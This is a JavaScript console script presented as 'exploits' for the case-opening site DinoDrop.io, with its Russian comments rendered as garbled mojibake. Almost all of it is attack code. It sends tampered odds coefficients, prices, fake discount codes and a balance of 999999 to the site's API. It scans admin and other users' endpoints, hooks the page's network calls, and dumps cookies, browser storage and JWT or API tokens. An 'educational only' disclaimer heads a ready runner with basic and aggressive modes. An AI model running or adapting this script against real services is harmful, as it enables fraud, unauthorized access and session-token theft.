/**
 * DinoDrop.io - –ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏–µ –ø—Ä–∏–º–µ—Ä—ã —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤ –¥–ª—è –∫–æ–Ω—Å–æ–ª–∏ –±—Ä–∞—É–∑–µ—Ä–∞
 * 
 * –í–ù–ò–ú–ê–ù–ò–ï: –≠—Ç–∏ –ø—Ä–∏–º–µ—Ä—ã –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω—ã —Ç–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π
 * –∏ –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –¥–ª—è —Ä–µ–∞–ª—å–Ω–æ–≥–æ
 * –≤–∑–ª–æ–º–∞ —è–≤–ª—è–µ—Ç—Å—è –Ω–µ–∑–∞–∫–æ–Ω–Ω—ã–º.
 */

console.log("üî¥ DinoDrop.io Security Exploits - Loaded");

// ===== EXPLOIT 1: –ú–ê–ù–ò–ü–£–õ–Ø–¶–ò–Ø –ö–û–≠–§–§–ò–¶–ò–ï–ù–¢–û–ú –ö–ï–ô–°–ê =====
/**
 * –û—Å–Ω–æ–≤–Ω–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å: –ø–∞—Ä–∞–º–µ—Ç—Ä coefficient –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ—Ç—Å—è –∫–ª–∏–µ–Ω—Ç–æ–º
 * API: POST /cases/main –∏–ª–∏ /cases/free
 * –ü–∞—Ä–∞–º–µ—Ç—Ä—ã: {id: caseId, open: coefficient}
 */

const CaseExploit = {
    // –ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–µ–π—Å–µ
    getCaseInfo: async function(caseId) {
        try {
            const response = await fetch(`https://dinodrop.io/api/cases/get/${caseId}`, {
                method: 'GET',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
            });
            const data = await response.json();
            console.log(`üì¶ Case Info [${caseId}]:`, data);
            return data;
        } catch (error) {
            console.error('‚ùå Error getting case info:', error);
            return null;
        }
    },

    // –û—Ç–∫—Ä—ã—Ç—å –∫–µ–π—Å —Å –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–º –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç–æ–º
    openCaseWithCoefficient: async function(caseId, coefficient = 10) {
        console.log(`üé∞ Attempting to open case ${caseId} with coefficient ${coefficient}`);
        
        try {
            const response = await fetch('https://dinodrop.io/api/cases/main', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify({
                    id: caseId,
                    open: coefficient  // –£–Ø–ó–í–ò–ú–û–°–¢–¨: –∫–ª–∏–µ–Ω—Ç –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ—Ç –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç
                })
            });

            const result = await response.json();
            console.log(`üéÅ Case opening result:`, result);
            
            if (result.success) {
                console.log(`‚úÖ SUCCESS! Received item:`, result.item);
                console.log(`üí∞ Value: ${result.item?.price || 'Unknown'}`);
            }
            
            return result;
        } catch (error) {
            console.error('‚ùå Case opening failed:', error);
            return null;
        }
    },

    // –ü–æ–ø—ã—Ç–∫–∞ –æ—Ç–∫—Ä—ã—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π –∫–µ–π—Å
    openFreeCase: async function(caseId, coefficient = 1) {
        console.log(`üÜì Attempting to open FREE case ${caseId}`);
        
        try {
            const response = await fetch('https://dinodrop.io/api/cases/free', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    id: caseId,
                    open: coefficient
                })
            });

            const result = await response.json();
            console.log(`üéÅ Free case result:`, result);
            return result;
        } catch (error) {
            console.error('‚ùå Free case opening failed:', error);
            return null;
        }
    }
};

// ===== EXPLOIT 2: –ú–ê–ù–ò–ü–£–õ–Ø–¶–ò–Ø –¶–ï–ù–ê–ú–ò =====
/**
 * –£—è–∑–≤–∏–º–æ—Å—Ç—å: —Ä–∞—Å—á–µ—Ç—ã —Ü–µ–Ω –ø—Ä–æ–∏—Å—Ö–æ–¥—è—Ç –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ
 * –ú–æ–∂–Ω–æ –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ü–µ–Ω—ã
 */

const PriceExploit = {
    // –ü–æ–ø—ã—Ç–∫–∞ –∫—É–ø–∏—Ç—å –∫–µ–π—Å —Å –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ü–µ–Ω–æ–π
    buyWithModifiedPrice: async function(caseId, originalPrice, modifiedPrice) {
        console.log(`üí∏ Attempting to buy case ${caseId} for ${modifiedPrice} instead of ${originalPrice}`);
        
        try {
            // –°–Ω–∞—á–∞–ª–∞ –ø–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–µ–π—Å–µ
            const caseInfo = await CaseExploit.getCaseInfo(caseId);
            
            if (!caseInfo) return null;

            // –ü–æ–ø—ã—Ç–∫–∞ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∑–∞–ø—Ä–æ—Å —Å –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ü–µ–Ω–æ–π
            const response = await fetch('https://dinodrop.io/api/cases/buy', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    id: caseId,
                    price: modifiedPrice,  // –ü–û–ü–´–¢–ö–ê: –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Ü–µ–Ω—É
                    original_price: originalPrice
                })
            });

            const result = await response.json();
            console.log(`üõí Purchase result:`, result);
            return result;
            
        } catch (error) {
            console.error('‚ùå Purchase failed:', error);
            return null;
        }
    },

    // –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ —Ñ–µ–π–∫–æ–≤–æ–≥–æ –ø—Ä–æ–º–æ–∫–æ–¥–∞/—Å–∫–∏–¥–∫–∏
    applyFakeDiscount: async function(caseId, discountPercent = 90) {
        console.log(`üé´ Attempting to apply ${discountPercent}% discount to case ${caseId}`);
        
        try {
            const response = await fetch('https://dinodrop.io/api/promocode/apply', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    case_id: caseId,
                    discount: discountPercent,
                    code: 'FAKE_DISCOUNT_' + Math.random().toString(36).substr(2, 9)
                })
            });

            const result = await response.json();
            console.log(`üé´ Discount result:`, result);
            return result;
            
        } catch (error) {
            console.error('‚ùå Discount application failed:', error);
            return null;
        }
    }
};

// ===== EXPLOIT 3: API ENDPOINT ENUMERATION =====
/**
 * –ü–æ–ø—ã—Ç–∫–∞ –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å —Å–∫—Ä—ã—Ç—ã–µ API —ç–Ω–¥–ø–æ–∏–Ω—Ç—ã
 */

const APIExploit = {
    // –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö —ç–Ω–¥–ø–æ–∏–Ω—Ç–æ–≤
    scanEndpoints: async function() {
        const endpoints = [
            'api/user/profile',
            'api/user/balance',
            'api/admin/cases',
            'api/admin/users',
            'api/cases/all',
            'api/cases/stats',
            'api/market/items',
            'api/market/sell',
            'api/market/buy',
            'api/promocodes/list',
            'api/transactions/history'
        ];

        console.log(`üîç Scanning ${endpoints.length} potential endpoints...`);

        for (const endpoint of endpoints) {
            try {
                const response = await fetch(`https://dinodrop.io/${endpoint}`, {
                    method: 'GET',
                    credentials: 'include'
                });

                if (response.status !== 404) {
                    console.log(`‚úÖ Found endpoint: /${endpoint} - Status: ${response.status}`);
                    
                    if (response.status === 200) {
                        try {
                            const data = await response.json();
                            console.log(`üìÑ Data preview:`, JSON.stringify(data).substring(0, 200) + '...');
                        } catch (e) {
                            console.log(`üìÑ Response is not JSON`);
                        }
                    }
                }
            } catch (error) {
                // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ —Å–µ—Ç–∏
            }
        }
    },

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π
    checkAdminAccess: async function() {
        const adminEndpoints = [
            'api/admin/dashboard',
            'api/admin/settings',
            'api/admin/users/list',
            'api/admin/cases/create',
            'api/admin/statistics'
        ];

        console.log(`üîê Checking admin access...`);

        for (const endpoint of adminEndpoints) {
            try {
                const response = await fetch(`https://dinodrop.io/${endpoint}`, {
                    method: 'GET',
                    credentials: 'include'
                });

                console.log(`üîê Admin endpoint /${endpoint}: Status ${response.status}`);
                
                if (response.status === 200) {
                    console.log(`üö® POTENTIAL ADMIN ACCESS FOUND!`);
                }
            } catch (error) {
                // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏
            }
        }
    }
};

// ===== EXPLOIT 4: SESSION/AUTHENTICATION BYPASS =====
/**
 * –ü–æ–ø—ã—Ç–∫–∏ –æ–±—Ö–æ–¥–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
 */

const AuthExploit = {
    // –ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–º –¥–∞–Ω–Ω—ã–º
    getUserData: async function(userId = null) {
        const endpoints = [
            'api/user/profile',
            'api/user/inventory',
            'api/user/transactions',
            'api/user/settings'
        ];

        if (userId) {
            endpoints.push(`api/user/${userId}/profile`);
            endpoints.push(`api/user/${userId}/inventory`);
        }

        console.log(`üë§ Attempting to access user data...`);

        for (const endpoint of endpoints) {
            try {
                const response = await fetch(`https://dinodrop.io/${endpoint}`, {
                    method: 'GET',
                    credentials: 'include'
                });

                if (response.status === 200) {
                    console.log(`‚úÖ Access granted to: /${endpoint}`);
                    const data = await response.json();
                    console.log(`üìä Data:`, data);
                }
            } catch (error) {
                // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏
            }
        }
    },

    // –ü–æ–ø—ã—Ç–∫–∞ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ –±–∞–ª–∞–Ω—Å–∞
    modifyBalance: async function(newBalance) {
        console.log(`üí∞ Attempting to set balance to ${newBalance}...`);
        
        try {
            const response = await fetch('https://dinodrop.io/api/user/balance', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    balance: newBalance,
                    action: 'set'
                })
            });

            const result = await response.json();
            console.log(`üí∞ Balance modification result:`, result);
            return result;
        } catch (error) {
            console.error('‚ùå Balance modification failed:', error);
            return null;
        }
    }
};

// ===== AUTOMATION FUNCTIONS =====
/**
 * –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏ –∞—Ç–∞–∫
 */

const AutomationExploit = {
    // –ú–∞—Å—Å–æ–≤–æ–µ –æ—Ç–∫—Ä—ã—Ç–∏–µ –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∫–µ–π—Å–æ–≤
    massOpenFreeCases: async function(caseIds, delay = 1000) {
        console.log(`ü§ñ Starting mass free case opening for ${caseIds.length} cases...`);
        
        const results = [];
        
        for (const caseId of caseIds) {
            const result = await CaseExploit.openFreeCase(caseId);
            results.push({ caseId, result });
            
            console.log(`‚è≥ Waiting ${delay}ms before next attempt...`);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
        
        console.log(`üéÅ Mass opening completed. Results:`, results);
        return results;
    },

    // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Å–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∫–µ–π—Å–∞—Ö
    gatherCaseInfo: async function(startId = 1, endId = 100) {
        console.log(`üìä Gathering case information from ID ${startId} to ${endId}...`);
        
        const cases = [];
        
        for (let id = startId; id <= endId; id++) {
            const caseInfo = await CaseExploit.getCaseInfo(id);
            if (caseInfo) {
                cases.push(caseInfo);
                console.log(`‚úÖ Found case ${id}: ${caseInfo.name || 'Unknown'}`);
            }
            
            // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ —á—Ç–æ–±—ã –Ω–µ –ø–µ—Ä–µ–≥—Ä—É–∂–∞—Ç—å —Å–µ—Ä–≤–µ—Ä
            await new Promise(resolve => setTimeout(resolve, 200));
        }
        
        console.log(`üìä Found ${cases.length} cases total`);
        return cases;
    }
};

// ===== UTILITY FUNCTIONS =====
/**
 * –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
 */

const Utils = {
    // –ü–µ—Ä–µ—Ö–≤–∞—Ç –∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Å–µ—Ö —Å–µ—Ç–µ–≤—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
    interceptNetworkRequests: function() {
        console.log(`üïµÔ∏è Setting up network request interception...`);
        
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            console.log(`üåê INTERCEPTED FETCH:`, args[0], args[1]);
            return originalFetch.apply(this, args).then(response => {
                console.log(`üì• RESPONSE:`, response.status, response.url);
                return response;
            });
        };

        // –¢–∞–∫–∂–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º XMLHttpRequest –µ—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è
        const originalXHR = window.XMLHttpRequest.prototype.open;
        window.XMLHttpRequest.prototype.open = function(method, url, ...args) {
            console.log(`üåê INTERCEPTED XHR:`, method, url);
            return originalXHR.apply(this, [method, url, ...args]);
        };
        
        console.log(`‚úÖ Network interception active`);
    },

    // –ê–Ω–∞–ª–∏–∑ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ö—Ä–∞–Ω–∏–ª–∏—â–∞
    analyzeLocalStorage: function() {
        console.log(`üóÑÔ∏è Analyzing local storage...`);
        
        console.log(`üì± LocalStorage contents:`);
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            console.log(`  ${key}:`, value);
        }
        
        console.log(`üç™ SessionStorage contents:`);
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            console.log(`  ${key}:`, value);
        }
        
        console.log(`üç™ Cookies:`, document.cookie);
    },

    // –ü–æ–∏—Å–∫ JWT —Ç–æ–∫–µ–Ω–æ–≤ –∏ API –∫–ª—é—á–µ–π
    findTokens: function() {
        console.log(`üîë Searching for tokens and API keys...`);
        
        const sources = [
            localStorage,
            sessionStorage,
            document.cookie,
            JSON.stringify(window)
        ];
        
        const tokenPatterns = [
            /jwt[_-]?token/i,
            /bearer[_\s]+([a-zA-Z0-9\-._~+/]+=*)/i,
            /api[_-]?key/i,
            /access[_-]?token/i,
            /refresh[_-]?token/i,
            /eyJ[a-zA-Z0-9\-._~+/]+=*/g  // JWT pattern
        ];
        
        sources.forEach((source, index) => {
            const sourceNames = ['localStorage', 'sessionStorage', 'cookies', 'window'];
            const sourceStr = typeof source === 'string' ? source : JSON.stringify(source);
            
            tokenPatterns.forEach(pattern => {
                const matches = sourceStr.match(pattern);
                if (matches) {
                    console.log(`üîë Found potential token in ${sourceNames[index]}:`, matches);
                }
            });
        });
    }
};

// ===== MAIN EXPLOIT RUNNER =====
/**
 * –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤
 */

window.DinodropExploits = {
    // –ó–∞–ø—É—Å–∫ –±–∞–∑–æ–≤–æ–≥–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
    runBasicTests: async function() {
        console.log(`üöÄ Starting basic exploit tests...`);
        
        // –ê–Ω–∞–ª–∏–∑ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ö—Ä–∞–Ω–∏–ª–∏—â–∞
        Utils.analyzeLocalStorage();
        Utils.findTokens();
        
        // –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–µ–π—Å–µ
        await CaseExploit.getCaseInfo(1);
        
        // –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —ç–Ω–¥–ø–æ–∏–Ω—Ç–æ–≤
        await APIExploit.scanEndpoints();
        
        console.log(`‚úÖ Basic tests completed`);
    },

    // –ó–∞–ø—É—Å–∫ –∞–≥—Ä–µ—Å—Å–∏–≤–Ω–æ–≥–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
    runAggressiveTests: async function() {
        console.log(`‚ö° Starting aggressive exploit tests...`);
        
        // –ü–µ—Ä–µ—Ö–≤–∞—Ç —Å–µ—Ç–µ–≤—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
        Utils.interceptNetworkRequests();
        
        // –ü–æ–ø—ã—Ç–∫–∞ –æ—Ç–∫—Ä—ã—Ç—å –∫–µ–π—Å —Å –≤—ã—Å–æ–∫–∏–º –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç–æ–º
        await CaseExploit.openCaseWithCoefficient(1, 100);
        
        // –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–π –¥–æ—Å—Ç—É–ø
        await APIExploit.checkAdminAccess();
        
        // –ü–æ–ø—ã—Ç–∫–∞ –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å –±–∞–ª–∞–Ω—Å
        await AuthExploit.modifyBalance(999999);
        
        console.log(`‚ö° Aggressive tests completed`);
    },

    // –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞
    CaseExploit,
    PriceExploit,
    APIExploit,
    AuthExploit,
    AutomationExploit,
    Utils
};

console.log(`
üéØ DinoDrop.io Exploits Loaded Successfully!

üìù Available commands:
- DinodropExploits.runBasicTests()     - –ó–∞–ø—É—Å—Ç–∏—Ç—å –±–∞–∑–æ–≤—ã–µ —Ç–µ—Å—Ç—ã
- DinodropExploits.runAggressiveTests() - –ó–∞–ø—É—Å—Ç–∏—Ç—å –∞–≥—Ä–µ—Å—Å–∏–≤–Ω—ã–µ —Ç–µ—Å—Ç—ã
- DinodropExploits.CaseExploit.getCaseInfo(id) - –ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–µ–π—Å–µ
- DinodropExploits.CaseExploit.openCaseWithCoefficient(id, coef) - –û—Ç–∫—Ä—ã—Ç—å –∫–µ–π—Å —Å –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç–æ–º

‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –≤ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª—è—Ö!
`);